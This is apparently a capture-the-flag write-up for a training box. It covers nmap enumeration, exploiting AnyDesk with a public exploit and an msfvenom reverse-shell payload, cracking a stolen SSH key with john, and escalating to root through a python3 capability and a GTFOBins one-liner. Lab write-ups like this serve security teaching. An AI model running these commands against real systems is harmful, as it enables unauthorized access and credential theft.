# Enumeration

Let's start with a full nmap scan. We follow up with a detailed scan of the open port(s).

![028418fe88c9edef620371a7cf70c46e.png](../../_resources/028418fe88c9edef620371a7cf70c46e.png)

Rustscan was giving some unusual results, so I ran the full nmap scan and found another open port with an unknown service running on it.

![9d992c674533388b9ecaff8ddfe5eef2.png](../../_resources/9d992c674533388b9ecaff8ddfe5eef2.png)

We'll scan these ports again with a more detailed nmap scan; here I included the new port just in case.

![dfaacd0aed83a59b0f6df4257aafa31d.png](../../_resources/dfaacd0aed83a59b0f6df4257aafa31d.png)

It looks like port 46547 is closed, so we'll ignore it. Note that the ssl certificate gives us some information about the service running on port 7070.

`| ssl-cert: Subject: commonName=AnyDesk Client`

So, the service running on port 7070 seems to be AnyDesk.

<br>

# Exploitation

Let's see if we can find any exploits for AnyDesk. [Exploit-db](https://www.exploit-db.com/exploits/49613) is the first result that comes up when Googling "AnyDesk exploit", so let's take a look.

![f97c1a896cbef7ce16656f6ba5a99fe7.png](../../_resources/f97c1a896cbef7ce16656f6ba5a99fe7.png)

We download the python script and examine its contents. For the exploit to work, we need to follow the commented suggestion in the python script and generate a payload with msfvenom using:

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<attacking machine> LPORT=<listening port> -b "\x00\x25\x26" -f python -v shellcode
```

![72d8e0348999ac2b8118327bea7fc83f.png](../../_resources/72d8e0348999ac2b8118327bea7fc83f.png)

We paste the payload in the appropriate location in the python script.

![d65e8a145a148ccbeef8e5bfcdcb82b5.png](../../_resources/d65e8a145a148ccbeef8e5bfcdcb82b5.png)

We also need to change the target IP. Note that the port number **should not** be altered. (This confused me, as I was changing it to 7070 only to have the script fail. Some googling helped.)

![91c239de02c66d66b2b87a2e325bc839.png](../../_resources/91c239de02c66d66b2b87a2e325bc839.png)

Now set up a netcat listener on the chosen port and run the exploit.

![6c45a028f01f76d7f40119a10fc2e3b5.png](../../_resources/6c45a028f01f76d7f40119a10fc2e3b5.png)

(Note: For some reason, changing the LPORT value throughout the above process made the script fail for me. I had to use the default of 4444 to get the exploit to work. This really shouldn't matter; perhaps just a bit of bad luck?)

![8df0915cb0a66d19b8def222f5e9586d.png](../../_resources/8df0915cb0a66d19b8def222f5e9586d.png)

Success! We now have access to annie's account. From here, we easily find the `user.txt` flag.

![490bedc5456e29ad7e87d3be58688837.png](../../_resources/490bedc5456e29ad7e87d3be58688837.png)

At this point, I lost the shell and couldn't get back in with the above method. I tried generating another payload with msfvenom and changing the LPORT value, but to no avail. Resetting the box seemed to fix the issue.
<br>

# Post-Exploitation

Before looking for privesc methods, let's upgrade our shell using `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Within annie's home directory, we find the `.ssh` directory which contains a private RSA key.

![8f372c3a04af6485bf28e24b8163a829.png](../../_resources/8f372c3a04af6485bf28e24b8163a829.png)

If we want, we could use ssh2john to parse the private key, then use john to find the private key password. This would allow us to ssh directly into the machine as annie. While not strictly necessary, let's do it for the sake of completeness (and to have an easy way back in, just in case the connection gets dropped).

Let's save the entirety of the contents of the `id_rsa` file to a file on our local machine, which we also call `id_rsa`. We can use john to find the password to annie's private key. First, run `ssh2john id_rsa > id_rsa.txt` to parse the keyfile. Now run john using the `rockyou.txt` wordlist with `john id_rsa.txt --wordlist=/usr/share/wordlists/rockyou.txt`.

![2ba481c32c197f562a66352845d4f9e4.png](../../_resources/2ba481c32c197f562a66352845d4f9e4.png)

Now use `chmod 600` to give the private key the correct permissions for ssh. Then ssh in using `ssh -i id_rsa annie@10.10.115.191` together with the password john found.

![f8826eed500093edc23c9352c704ec5b.png](../../_resources/f8826eed500093edc23c9352c704ec5b.png)

Now let's actually begin our search for privesc methods. Start by looking for binaries with the SUID bit set using `find / -type f -perm -u=s 2>/dev/null`.

![17c72cafd0bd0aa0662b6771aeac8b90.png](../../_resources/17c72cafd0bd0aa0662b6771aeac8b90.png)

The very first one on the above list is of interest; `setcap` is a program which allows us to set file capabilities. If certain binaries have capabilities set, we can [use this for privesc](https://gtfobins.github.io/#+capabilities). The capability we want to set here is `cap_setuid+ep`, and we are going to give python this capability (since python shows up on the GTFOBins list, and we know the target machine is running python3). The strategy that I used comes from [this article](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) on privesc using capabilities.

If we try to set the capabilities in the python's standard directory, we encounter an errror. So let's copy python3 to annie's home directory and then try setting the capability:

```
cp /usr/bin/python3 ~/python3
setcap cap_setuid+ep ~/python3
```

We can verify that this worked by using `getcap`:

![7cd4dd0484b58344fdfcd439ee00cba9.png](../../_resources/7cd4dd0484b58344fdfcd439ee00cba9.png)

Now we can use the one-liner from GTFOBins: `./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'`.

![499479f0a9f5e00284095b6ad66fb484.png](../../_resources/499479f0a9f5e00284095b6ad66fb484.png)

We quickly find the `root.txt` flag.

![ee8ac752724e5af6f73cc5b939dfaf4d.png](../../_resources/ee8ac752724e5af6f73cc5b939dfaf4d.png)

(We also find a THM voucher, but we're a bit too late! Oh well.)

